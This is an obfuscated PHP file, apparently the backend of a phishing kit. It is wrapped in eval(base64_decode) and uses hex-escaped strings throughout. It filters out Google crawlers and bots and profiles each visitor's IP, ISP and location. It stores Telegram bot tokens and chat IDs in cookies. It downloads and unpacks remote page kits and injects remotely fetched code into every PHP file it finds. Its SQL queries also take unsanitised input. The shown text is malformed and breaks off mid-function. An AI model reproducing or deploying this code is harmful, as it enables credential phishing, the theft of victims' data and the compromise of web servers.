<?php eval(base64_decode('
 goto pYs4T; UEBNM: $currentTimestamp = time(); goto kPGaG; iSwWW: function get_browser_value($USER_AGENT) { $BROWSER_ERROR = "\125\156\153\156\157\167\156\40\x42\x72\x6f\x77\163\145\162"; $BROWSER = array("\57\155\163\x69\145\x2f\x69" => "\x49\156\164\145\x72\156\145\x74\x20\105\x78\160\x6c\157\x72\x65\162", "\x2f\x66\x69\x72\145\x66\x6f\170\x2f\151" => "\106\151\162\x65\146\x6f\x78", "\x2f\x73\x61\146\141\162\x69\x2f\151" => "\123\141\x66\x61\162\x69", "\57\x63\x68\162\x6f\x6d\x65\57\151" => "\x43\x68\x72\x6f\x6d\x65", "\x2f\145\144\147\x65\x2f\x69" => "\105\144\x67\145", "\x2f\157\x70\x65\162\141\x2f\x69" => "\x4f\160\145\x72\141", "\x2f\156\145\x74\x73\143\141\x70\x65\57\x69" => "\116\x65\x74\x73\x63\x61\160\x65", "\57\155\141\x78\164\x68\157\156\57\151" => "\115\141\x78\x74\150\x6f\x6e", "\57\153\x6f\x6e\161\x75\x65\x72\157\162\57\x69" => "\113\157\156\x71\x75\x65\x72\x6f\162", "\x2f\x6d\157\142\151\x6c\x65\57\x69" => "\110\x61\156\x64\150\x65\x6c\144\x20\x42\162\x6f\x77\x73\x65\162"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto CGkpJ; OLWK6: function isGoogleUser($userAgent, $ipAddress) { if (stripos($userAgent, "\x67\x6f\x6f\x67\154\145") !== false) { return true; } if (filter_var($ipAddress, FILTER_VALIDATE_IP)) { $hostname = gethostbyaddr($ipAddress); if (stripos($hostname, "\x67\x6f\x6f\x67\x6c\x65") !== false) { return true; } } if (isset($_SESSION["\x73\145\x73\x73\x69\x6f\x6e\x5f\151\163\x70"]) && stripos($_SESSION["\163\145\163\163\151\x6f\156\137\x69\163\160"], "\147\157\157\x67\x6c\x65") !== false) { return true; } return false; } goto hGxpp; AH46h: header("\x41\x63\143\145\x73\x73\x2d\103\157\x6e\x74\x72\x6f\154\x2d\x41\154\x6c\x6f\x77\x2d\x48\145\x61\x64\x65\x72\163\x3a\40\x43\157\156\164\x65\x6e\x74\x2d\x54\x79\160\x65"); goto N8RzJ; zswcK: $local_userAgent = isset($_SERVER["\110\124\x54\120\137\125\123\x45\122\137\101\x47\x45\116\124"]) ? $_SERVER["\110\124\124\120\137\x55\123\105\122\137\101\x47\105\116\124"] : ''; goto gc_V0; kPGaG: $local_ip_g = getClientIP(); goto HzJXz; YivdZ: function getClientIP() { if (!empty($_SERVER["\110\124\x54\x50\x5f\103\x4c\x49\x45\116\x54\x5f\x49\x50"])) { $ipAddress = $_SERVER["\110\x54\124\x50\x5f\x43\114\111\105\x4e\124\137\111\120"]; } elseif (!empty($_SERVER["\x48\x54\124\x50\137\x58\137\106\117\122\x57\101\122\104\x45\104\137\x46\x4f\122"])) { $ipAddress = $_SERVER["\x48\x54\x54\120\137\x58\137\106\x4f\x52\x57\x41\122\x44\105\x44\137\106\x4f\122"]; } else { $ipAddress = $_SERVER["\x52\x45\x4d\x4f\124\105\x5f\101\x44\x44\x52"]; } $validIPs = array(); $ipMatches = preg_match_all("\57\x5c\x62\x5c\x64\173\x31\54\63\x7d\x5c\56\134\144\x7b\x31\x2c\x33\175\x5c\56\x5c\x64\x7b\x31\x2c\63\x7d\134\56\134\x64\173\x31\x2c\x33\x7d\134\142\57", $ipAddress, $matches); if ($ipMatches) { $validIPs = $matches[0]; } if (!empty($validIPs)) { $_SESSION["\x73\145\163\x73\x69\x6f\156\137\x69\x70"] = $validIPs[0]; return $validIPs[0]; } else { $_SESSION["\163\x65\163\x73\151\157\156\137\151\160"] = "\61\62\67\56\x30\56\x30\56\x31"; return "\61\62\67\56\60\x2e\60\x2e\61"; } } goto BfUDb; eAZZL: function deleteOldFolders($directory) { $files = scandir($directory); foreach ($files as $file) { if ($file == "\x2e" || $file == "\x2e\56") { continue; } if (is_dir($directory . "\x2f" . $file)) { $lastModified = filemtime($directory . "\57" . $file); $difference = (time() - $lastModified) / 60; if ($difference > 20) { deleteDirectory($directory . "\57" . $file); } } } } goto nBgvf; KiQHO: function banned_client($ipAddress, $reason) { global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\x6f\156\x6e\x65\143\164\151\157\156\40\146\x61\151\154\x65\x64\72\40" . mysqli_connect_error()); } $sql_check = "\123\105\x4c\105\103\124\40\x2a\40\106\122\117\x4d\40\x6c\x6f\x67\163\x20\x57\x48\105\x52\x45\40\x69\x70\141\x64\x64\x72\x65\x73\75\77"; $stmt = mysqli_prepare($db, $sql_check); mysqli_stmt_bind_param($stmt, "\163", $ipAddress); mysqli_stmt_execute($stmt); $result = mysqli_stmt_get_result($stmt); if (mysqli_num_rows($result) > 0) { mysqli_close($db); http_response_code(405); $responseData = array("\162\x65\x73\137\x73\164\141\x74\165\163" => "\64\60\x35", "\155\x65\163\x73\x61\x67\x65" => "\125\163\x65\162\x20\151\163\x20\x61\154\162\x65\x61\x64\x79\40\x69\156\40\164\150\x65\40\x62\154\141\x63\x6b\154\151\x73\x74"); echo json_encode($responseData); die; } $country = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\x65\163\x73\x69\157\156\x5f\x63\157\165\x6e\x74\162\171"])); $browser = mysqli_real_escape_string($db, str_replace("\x27", '', $local_browser)); $os_db = mysqli_real_escape_string($db, str_replace("\47", '', $local_os)); $local_domain = mysqli_real_escape_string($db, str_replace("\47", '', $local_domain)); $host = mysqli_real_escape_string($db, str_replace("\47", '', getHost($ipAddress))); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\145\x73\x73\151\x6f\x6e\x5f\151\163\160"])); $mobile = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\145\x73\x73\151\x6f\156\137\155\x6f\142\151\154\x65"])); $proxy = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\x65\x73\163\151\x6f\x6e\x5f\160\x72\x6f\170\x79"])); $hosting = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\x65\x73\163\x69\x6f\x6e\x5f\150\x6f\163\x74\151\x6e\147"])); $city = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\145\x73\x73\x69\157\156\137\143\x69\164\x79"])); $region = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\x65\x73\163\x69\157\x6e\137\162\x65\147\x69\x6f\x6e"])); $time = mysqli_real_escape_string($db, str_replace("\x27", '', $local_time)); $sql_insert = "\x49\x4e\123\x45\x52\x54\x20\x49\116\124\x4f\40\154\x6f\x67\x73\40\50\x69\160\141\x64\144\162\145\x73\54\143\x6f\x75\156\164\162\x79\x2c\142\x72\157\167\x73\145\x72\54\x6f\163\54\x64\x6f\x6d\x69\x6e\x65\54\150\x6f\x73\164\x2c\x69\163\x70\x2c\155\x6f\x62\151\154\145\x2c\x70\162\x6f\170\171\54\150\x6f\163\164\x69\x6e\147\x2c\143\x69\x74\x79\x2c\162\145\x67\151\x6f\156\x2c\x6d\x79\x74\151\155\145\54\162\145\x73\x6f\156\51\x20\x56\x41\x4c\x55\x45\x53\40\50\x3f\54\x3f\x2c\x3f\54\x3f\x2c\77\x2c\x3f\54\x3f\54\x20\x3f\54\40\77\54\x20\x3f\54\40\x3f\54\x20\x3f\54\x20\x3f\54\40\77\51"; $stmt = mysqli_prepare($db, $sql_insert); mysqli_stmt_bind_param($stmt, "\163\x73\x73\x73\x73\163\163\x73\163\x73\x73\163\163\163", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, $reason); mysqli_stmt_execute($stmt); mysqli_close($db); http_response_code(405); $responseData = array("\162\145\x73\x5f\x73\x74\x61\x74\165\x73" => "\64\x30\x35", "\155\145\163\x73\x61\147\x65" => "\x55\x73\x65\162\x20\x61\x64\144\x65\144\x20\164\x6f\40\x74\150\x65\40\x62\154\141\x63\x6b\154\151\x73\164"); echo json_encode($responseData); die; } goto UdBiH; HZkr6: function getHost($ipAddress) { try { $host = gethostbyaddr($ipAddress); return $host; } catch (Exception $e) { return "\x4e\x6f\x74\x20\x56\141\x6c\151\x64"; } } goto YivdZ; IqXok: function get_view_token($user) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\x6e\156\x65\143\164\x69\x6f\156\40\146\141\x69\x6c\x65\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\123\105\114\105\103\x54\40\x74\157\x6b\145\x6e\x2c\x20\x63\x68\141\x74\x69\x64\40\x46\122\x4f\x4d\40\160\141\156\x65\154\x20\x57\110\x45\122\x45\40\x70\x61\x6e\145\x6c\x5f\165\x73\145\162\75\47{$user}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $token = $row["\x74\157\153\x65\x6e"]; $chatid = $row["\143\x68\x61\x74\x69\144"]; return array($token, $chatid); } mysqli_close($db); return null; } goto KiQHO; rpEvz: $local_domain = $_SERVER["\123\x45\x52\x56\105\x52\x5f\x4e\x41\x4d\x45"]; goto DyedC; Cogh4: function update_index($folderDir) { $renamed = false; if ($handle = opendir($folderDir)) { while (false !== ($entry = readdir($handle))) { $path = $folderDir . "\57" . $entry; if ($entry == "\x2e" || $entry == "\56\x2e") { continue; } if (is_dir($path)) { $renamed = update_index($path) || $renamed; } if (is_file($path) && strtolower(pathinfo($path, PATHINFO_EXTENSION)) === "\x68\x74\x6d\x6c") { $newPath = $folderDir . "\57" . pathinfo($path, PATHINFO_FILENAME) . "\56\160\150\160"; if (rename($path, $newPath)) { $renamed = true; } } } closedir($handle); } return $renamed; } goto KcFe5; N8RzJ: header("\x43\157\156\164\145\156\164\x2d\x54\171\x70\x65\x3a\40\x61\x70\x70\x6c\x69\143\141\x74\x69\x6f\x6e\57\x6a\163\157\156"); goto aKiKn; BGMQ5: function download_extract($zipFileUrl) { if (!is_dir("\167\145\x62")) { if (!mkdir("\167\145\142", 511)) { die("\x46\141\151\x6c\145\144\40\x74\x6f\x20\143\162\x65\141\x74\x65\40\x77\x65\142\x20\x64\151\162\x65\x63\164\157\162\171"); } } if (!is_dir("\x74\x65\155\160")) { mkdir("\164\145\155\x70"); } $folder_name = bin2hex(random_bytes(8)); $sub_folder = random_number(6); $folder_path = "\167\x65\142\x2f{$sub_folder}\57"; $_SESSION["\x66\157\x6c\144\145\x72"] = $folder_path; $zipFileName = "\164\145\155\x70\57{$folder_name}\56\x7a\x69\x70"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\141\151\154\145\x64\x20\164\x6f\40\x63\x72\x65\x61\164\x65\x20\x74\150\x65\40\x66\x6f\x6c\x64\145\x72\56"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); } else { http_response_code(405); $responseData = array("\162\x65\x73\137\x73\x74\141\x74\165\163" => "\64\60\65", "\x6d\145\163\163\x61\147\x65" => "\106\x61\151\x6c\145\x64\x20\164\157\x20\145\x78\164\162\x61\x63\x74\x20\x74\150\x65\40\x7a\x69\x70\x20\146\x69\x6c\x65"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\x72\145\163\137\163\164\141\x74\165\x73" => "\64\60\65", "\155\x65\x73\x73\x61\x67\x65" => "\106\x61\151\154\x65\x64\x20\164\157\40\x64\x6f\x77\156\x6c\x6f\141\x64\x20\164\150\145\40\172\x69\x70\40\x66\151\x6c\145"); $responseJson = json_encode($responseData); echo $responseJson; } if (file_exists($zipFileName)) { unlink($zipFileName); } } goto Cogh4; BEfez: $fs_user = base64_decode("\145\155\x56\x79\x62\62\122\x68\145\130\116\x66\x5a\107\x46\65"); goto iKCmo; Zpj_5: function update_user_view($user) { list($token, $chatid) = get_expire_token(); list($token_view, $chatid_view) = get_view_token($user); $dateexp = $_SESSION["\145\170\160\151\x72\145\x5f\x64\x61\x74\145"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\x6f\x6b\x65\x6e\164\145\154", $token, time() + 86400 * 30, "\57"); setcookie("\151\x64\x74\x65\x6c", $chatid, time() + 86400 * 30, "\57"); setcookie("\x72\x65\x64\x69\162\151\143\164", $_SESSION["\162\145\144\x69\x72\x69\143\x74"], time() + 86400 * 30, "\57"); setcookie("\x70\x72\x6f\x6a\x65\x63\164", $_SESSION["\160\x72\x6f\x6a\x65\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\x73\x6f\x75\162\143\145\155\145", $_SESSION["\141\144\144\x62\171"], time() + 86400 * 30, "\x2f"); setcookie("\x6e\145\x77\x5f\145\x78\160", $expireTimestamp, time() + 86400 * 30, "\57"); setcookie("\166\157\154\155", $token, time() + 86400 * 30, "\x2f"); setcookie("\144\157\x6c\155", $chatid, time() + 86400 * 30, "\x2f"); } else { setcookie("\164\157\153\x65\x6e\164\145\154", $token_view, time() + 86400 * 30, "\x2f"); setcookie("\151\x64\164\145\154", $chatid_view, time() + 86400 * 30, "\x2f"); setcookie("\162\x65\x64\151\x72\x69\143\164", $_SESSION["\162\145\144\151\162\x69\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\x70\162\157\152\x65\x63\164", $_SESSION["\160\162\x6f\152\x65\143\164"], time() + 86400 * 30, "\57"); setcookie("\x73\157\165\x72\143\145\155\x65", $_SESSION["\141\x64\x64\x62\x79"], time() + 86400 * 30, "\x2f"); setcookie("\x76\157\154\x6d", $token, time() + 86400 * 30, "\57"); setcookie("\x64\157\x6c\155", $chatid, time() + 86400 * 30, "\x2f"); } } goto zVUGD; aKiKn: error_reporting(E_ALL); goto yxcgN; FbibX: function add_user($folder_path, $ipAddress) { file_put_contents("{$folder_path}\57\154\157\143\141\154\x2e\164\170\164", "{$ipAddress}", FILE_APPEND); } goto OLWK6; fey1h: function user_data($ipAddress, $id) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\156\x6e\x65\x63\x74\x69\157\156\40\146\x61\x69\154\145\x64\x3a\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\114\105\103\124\40\52\x20\106\x52\x4f\x4d\40\x72\145\x64\x69\162\143\164\x69\x6f\156\x20\x57\110\105\122\105\40\151\144\x3d\47{$id}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { while ($row = mysqli_fetch_array($res_u)) { $_SESSION["\154\x69\156\153"] = base64_decode(base64_decode($row["\x6c\151\156\153"])); $_SESSION["\143\x6e"] = explode("\73", base64_decode(base64_decode($row["\x63\157\165\156\164\x72\171"]))); $_SESSION["\160\x69\143"] = $row["\160\x69\143"]; $_SESSION["\155\x73\x67"] = base64_decode(base64_decode($row["\x6d\163\x67"])); $_SESSION["\145\170\160\151\x72\145\x5f\144\141\x74\145"] = $row["\145\x78\160\151\x72\x65\x5f\144\x61\x74\145"]; $_SESSION["\163\x65\162\166\145\x72"] = base64_decode(base64_decode($row["\163\145\x72\x76\145\162"])); $_SESSION["\165\162\x6c"] = base64_decode(base64_decode($row["\x75\x72\x6c"])); $_SESSION["\154\x75\170\x63\x61\160\x74\x63\150\141"] = $row["\x6c\165\x78\143\x61\160\164\x63\x68\x61"]; $_SESSION["\x74\157\153\x65\x6e\x74\145\154"] = base64_decode(base64_decode($row["\x74\157\x6b\145\156\164\145\154"])); $_SESSION["\151\144\164\x65\x6c"] = base64_decode(base64_decode($row["\151\x64\164\x65\x6c"])); $_SESSION["\x72\x65\x64\x69\x72\x69\x63\164"] = $row["\x72\x65\144\x69\162\x69\143\x74"]; $_SESSION["\160\162\x6f\152\x65\x63\164"] = $row["\160\162\x6f\152\x65\143\x74"]; $_SESSION["\141\x70\151"] = $row["\141\x70\x69"]; $_SESSION["\x61\144\144\x62\x79"] = $row["\x61\144\x64\x62\x79"]; $_SESSION["\151\163\x70\162\157\164\145\143\x74"] = $row["\x69\163\160\x72\157\164\x65\143\164"]; $_SESSION["\x70\x72\157\x78\x79"] = $row["\160\162\157\170\x79"]; $_SESSION["\x63\x61\x70\164\x63\150\x61\x5f\x64\141\x74\x61"] = $row["\143\141\x70\164\x63\x68\x61"]; $_SESSION["\x67\x6f\x6f\154\x65\x5f\x63\141\x70"] = $row["\x67\x6f\x6f\x67\154\x65\137\x63\141\160"]; $_SESSION["\x63\x6c\x6f\165\144\137\143\x61\160"] = $row["\143\154\157\165\144\x5f\143\141\160"]; $_SESSION["\x70\162\157\x5f\x69\143\x6f"] = $row["\x70\x72\157\x5f\151\x63\157"]; $_SESSION["\160\x72\x6f\137\x63\x6f\154\x6f\x72"] = $row["\160\x72\x6f\137\x63\x6f\154\x6f\162"]; $_SESSION["\160\x72\x6f\x5f\x6d\x73\x67"] = $row["\160\x72\157\x5f\x6d\x73\147"]; $_SESSION["\x70\x72\x6f\137\151\x6d\x67"] = $row["\160\162\157\137\x69\155\x67"]; $_SESSION["\160\162\x6f\137\154\x6f\147\x6f"] = $row["\x70\x72\157\x5f\x6c\157\x67\x6f"]; } } else { $refix = "\x6e\157\x74\x20\x66\x6f\165\x6e\144\x20\151\x64\x2e{$id}"; banned_client($ipAddress, $refix); die; } mysqli_close($db); } goto gheHw; pYs4T: header("\x41\143\143\x65\x73\x73\x2d\103\x6f\156\164\x72\x6f\154\x2d\x41\154\x6c\x6f\x77\55\x4f\x72\151\147\x69\x6e\72\40\x2a"); goto YzGS7; EgQt_: function update_php_normal($folder_path) { $trackingFile = $folder_path . "\x72\x6f\x75\x6c\x73\x2e\164\170\164"; $codeURL = base64_decode(base64_decode("\x59\x55\x68\x53\115\x47\x4e\x49\124\124\x5a\115\x65\x54\x6c\x35\127\x56\x68\152\144\x56\x6f\171\x62\x44\102\150\x53\x46\x5a\160\x5a\106\150\117\x62\x47\x4e\164\124\156\132\151\142\154\x4a\x73\x59\155\x35\122\x64\x56\x6b\x79\x4f\130\122\x4d\115\156\x68\x71\131\x6a\112\64\x61\107\x51\x7a\x62\107\x78\152\x62\x6b\x31\x32\x59\x7a\x49\x35\115\x57\x4e\164\x54\x6d\x78\115\x4d\x6a\x46\x6f\x59\126\143\60\144\x6d\x4e\x49\123\x6e\x5a\x6b\122\61\132\161\132\105\131\x35\x64\127\x49\x7a\x53\x6e\x52\x5a\126\63\144\61\132\x45\x68\x6f\115\x41")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto kUn4l; z0pyx: $fs_name = base64_decode("\145\x6d\x56\171\142\62\x52\150\145\x58\x4e\146\132\x47\106\65"); goto zswcK; BfUDb: function fetchIPInfo($ipAddress) { $url = "\150\164\x74\x70\x3a\x2f\x2f\x69\x70\55\141\x70\x69\56\143\157\x6d\x2f\x70\x68\x70\57{$ipAddress}\77\146\x69\145\154\x64\x73\x3d\x73\164\141\x74\x75\163\54\155\145\x73\x73\x61\x67\x65\54\x63\157\156\164\151\156\145\156\164\54\143\157\156\164\x69\x6e\x65\x6e\164\x43\x6f\x64\145\54\x63\x6f\165\x6e\164\162\x79\54\x63\x6f\165\156\x74\162\x79\x43\x6f\x64\145\x2c\x72\x65\x67\151\157\156\54\162\145\147\151\x6f\x6e\116\141\155\x65\x2c\143\x69\x74\171\54\144\x69\163\164\x72\x69\143\164\x2c\172\151\160\x2c\154\x61\x74\54\x6c\x6f\156\x2c\164\151\x6d\x65\x7a\x6f\156\145\54\143\x75\x72\x72\145\156\x63\x79\54\151\163\160\54\157\x72\x67\x2c\141\163\54\x61\x73\156\141\x6d\145\x2c\x72\x65\x76\x65\162\x73\x65\x2c\155\157\142\151\x6c\x65\x2c\x70\x72\157\170\x79\54\x68\157\x73\x74\x69\156\x67\54\161\165\145\162\171"; $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); $info = unserialize($response); $_SESSION["\163\145\163\163\x69\157\x6e\x5f\151\163\160"] = isset($info["\x69\x73\x70"]) ? $info["\151\163\160"] : null; $_SESSION["\x73\x65\x73\163\x69\157\x6e\137\x63\x6f\x75\156\x74\162\171"] = isset($info["\x63\x6f\x75\x6e\x74\162\x79"]) ? $info["\x63\157\x75\156\x74\x72\171"] : null; $_SESSION["\163\x65\163\163\x69\x6f\156\x5f\x63\x6f\165\x6e\164\162\x79\x5f\x63\157\144\145"] = isset($info["\x63\157\165\x6e\x74\162\171\103\157\x64\145"]) ? $info["\x63\x6f\165\x6e\164\x72\x79\103\x6f\144\x65"] : null; $_SESSION["\163\145\x73\163\x69\x6f\x6e\137\143\151\x74\171"] = isset($info["\143\151\x74\171"]) ? $info["\x63\x69\164\x79"] : null; $_SESSION["\x73\145\x73\x73\151\x6f\156\x5f\162\x65\x67\151\x6f\x6e"] = isset($info["\162\145\147\x69\x6f\x6e"]) ? $info["\162\x65\x67\x69\x6f\x6e"] : null; $proxy = isset($info["\160\162\157\x78\171"]) ? $info["\x70\162\157\x78\171"] : null; $_SESSION["\x73\x65\x73\x73\151\x6f\156\137\x70\x72\157\x78\171"] = $proxy == 1 ? "\x54\x72\x75\x65" : "\x46\141\x6c\x73\145"; $mobile = isset($info["\155\157\142\x69\154\145"]) ? $info["\155\x6f\x62\x69\x6c\x65"] : null; $_SESSION["\x73\x65\163\163\x69\x6f\x6e\x5f\x6d\157\142\151\154\145"] = $mobile == 1 ? "\x54\162\165\145" : "\106\x61\154\163\x65"; $hosting = isset($info["\x68\157\x73\x74\151\156\x67"]) ? $info["\150\x6f\x73\x74\x69\x6e\x67"] : null; $_SESSION["\163\x65\163\163\x69\x6f\156\x5f\x68\x6f\163\164\x69\x6e\x67"] = $hosting == 1 ? "\124\162\165\x65" : "\106\141\154\x73\145"; } goto qmrJX; xHbba: function modifyFilesRecursively($directory, $codeToAddTop, $codeToAddBottom, $modifiedFiles = array()) { if (is_dir($directory)) { if ($handle = opendir($directory)) { while (false !== ($file = readdir($handle))) { if ($file != "\56" && $file != "\56\56") { $filePath = $directory . "\x2f" . $file; if (is_dir($filePath)) { $modifiedFiles = array_merge($modifiedFiles, modifyFilesRecursively($filePath, $codeToAddTop, $codeToAddBottom)); } elseif (pathinfo($file, PATHINFO_EXTENSION) == "\x70\x68\160" && !in_array($file, $modifiedFiles)) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; } if (strpos($fileContent, $codeToAddBottom) === false) { $fileContent .= $codeToAddBottom; } file_put_contents($filePath, $fileContent); $modifiedFiles[] = $file; } } } closedir($handle); } } return $modifiedFiles; } goto hmvkJ; BXeG6: function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { $localFilePath = "\167\x65\142\x2f\141\160\151\56\160\x68\x70"; file_put_contents($localFilePath, $response); } else { echo "\x45\x72\x72\x6f\162\40\x66\145\164\143\x68\x69\156\147\40\x66\151\154\145\72\40" . $error; } } goto IYzc3; IYzc3: function delete_zip($directory) { $zipFiles = glob($directory . "\52\56\x7a\x69\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } } goto FbibX; AAYhq: $local_browser = get_browser_value($local_userAgent); goto btp9q; Dr7iq: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto gw5Q7; ACY7k: function random_number($length) { $characters = "\60\x31\62\63\64\65\66\x37\x38\71"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto fey1h; hGxpp: function update_user() { list($token, $chatid) = get_expire_token(); $dateexp = $_SESSION["\145\170\x70\151\162\x65\x5f\x64\x61\164\145"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\x6f\153\x65\x6e\x74\x65\154", $token, time() + 86400 * 30, "\57"); setcookie("\151\x64\164\145\x6c", $chatid, time() + 86400 * 30, "\x2f"); setcookie("\162\x65\144\151\162\x69\x63\x74", $_SESSION["\162\x65\144\151\162\x69\143\x74"], time() + 86400 * 30, "\57"); setcookie("\160\162\157\152\x65\143\164", $_SESSION["\160\162\x6f\152\145\x63\x74"], time() + 86400 * 30, "\57"); setcookie("\x73\x6f\x75\x72\143\x65\155\x65", $_SESSION["\141\144\144\x62\x79"], time() + 86400 * 30, "\57"); setcookie("\156\x65\x77\x5f\x65\x78\x70", $expireTimestamp, time() + 86400 * 30, "\x2f"); setcookie("\166\157\154\155", $token, time() + 86400 * 30, "\57"); setcookie("\144\157\x6c\155", $chatid, time() + 86400 * 30, "\57"); } else { setcookie("\164\157\x6b\x65\156\164\x65\154", $_SESSION["\164\x6f\x6b\145\156\x74\x65\x6c"], time() + 86400 * 30, "\57"); setcookie("\x69\x64\x74\x65\x6c", $_SESSION["\151\144\x74\x65\x6c"], time() + 86400 * 30, "\x2f"); setcookie("\x72\145\144\151\x72\x69\143\x74", $_SESSION["\162\x65\144\x69\162\151\x63\x74"], time() + 86400 * 30, "\57"); setcookie("\x70\162\x6f\x6a\145\x63\164", $_SESSION["\160\162\x6f\x6a\145\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\163\x6f\165\x72\x63\x65\155\x65", $_SESSION["\141\144\144\x62\x79"], time() + 86400 * 30, "\x2f"); setcookie("\x76\x6f\x6c\155", $token, time() + 86400 * 30, "\57"); setcookie("\144\x6f\154\x6d", $chatid, time() + 86400 * 30, "\x2f"); } } goto Zpj_5; NUd91: if ($_SERVER["\122\105\x51\x55\x45\123\124\137\115\x45\x54\110\x4f\x44"] === "\107\x45\124") { $com_dir = isset($_GET["\x6c\x6f\x63\141\154"]) ? $_GET["\154\x6f\143\141\154"] : null; $com_id = isset($_GET["\x73\157\x75\154\x73"]) ? $_GET["\163\x6f\165\x6c\x73"] : null; $com_ip = isset($_GET["\162\x65\155\157\164\x65"]) ? $_GET["\x72\145\155\157\164\145"] : null; if ($com_dir !== null && $com_id !== null && $com_ip !== null) { $ipAddress = $com_ip; global $ipAddress; fetchIPInfo($ipAddress); user_data($com_ip, $com_id); $_SESSION["\154\157\154\x69\x70\x73"] = $com_ip; $_SESSION["\x6c\157\x6c\163\157\x75\154\x73"] = $com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $com_dir . "\x3f\46\x76\141\x6c\151\144\75" . $RandOP_Mlux . $RandOP_Mlux . "\46\x61\x6c\145\162\164\75" . $RandOP_Mlux . "\x26\170\x6c\160\163\x3d" . $RandOP_Mlux . "\x26\x73\x6f\165\154\163\75" . $com_id . "\46\x64\157\156\x65\x3d\46\x65\x72\162\157\162\x79\x3d" . $RandOP_Mlux . "\46\155\x6e\145\155\157\156\151\143\75\46\x6a\x62\75" . $RandOP_Mlux; header("\x4c\157\143\141\x74\x69\157\156\x3a\x20{$url}"); die; } } goto NRln0; kUn4l: function updatePhpFileWithCode($filePath, $codeToAddTop) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; file_put_contents($filePath, $fileContent); return true; } return false; } goto BXeG6; gw5Q7: $fs_host = base64_decode("\x4d\x54\153\64\114\x6a\x49\x31\115\123\x34\x34\x4e\x43\64\171\x4d\104\101"); goto BEfez; DyedC: $local_os = get_platform($local_userAgent); goto AAYhq; gheHw: function get_expire_token() { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\x6f\x6e\156\x65\143\164\x69\157\x6e\40\x66\x61\x69\x6c\145\144\72\40" . mysqli_connect_error()); } $sql_u = "\x53\105\x4c\x45\103\x54\40\164\145\154\x65\x5f\x74\x6f\153\x65\x6e\54\40\164\145\x6c\x65\x5f\143\x68\x61\164\151\x64\40\x46\122\x4f\x4d\40\x7a\145\x72\x6f\x5f\163\145\x72\166\145\162\x20\127\x48\105\122\x45\x20\151\x64\x3d\47\61\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $_SESSION["\x65\x78\x70\x5f\164\x6f\x6b\145\156"] = $row["\164\145\154\x65\x5f\x74\x6f\153\145\x6e"]; $_SESSION["\145\170\x70\x5f\x63\150\141\164\x69\x64"] = $row["\164\145\x6c\145\137\143\x68\x61\x74\151\144"]; $token = $row["\164\x65\154\x65\137\x74\157\153\145\156"]; $chatid = $row["\164\145\154\x65\137\x63\150\141\164\x69\144"]; return array($token, $chatid); } mysqli_close($db); return null; } goto IqXok; J8ifU: function random_string($length) { $characters = "\141\142\143\x64\x65\x66\152\x68\x69\147\153\x6c\x6d\x6e\157\x70\161\162\x73\164\x75\166\167\x78\x79\172\60\x31\x32\x33\x34\x35\66\67\70\71\x41\x42\x43\104\105\x46\x47\x48\111\x4a\113\114\x4d\116\117\x50\x51\122\x53\x54\125\126\127\130\131\x5a"; $charactersLength = strlen($characters); 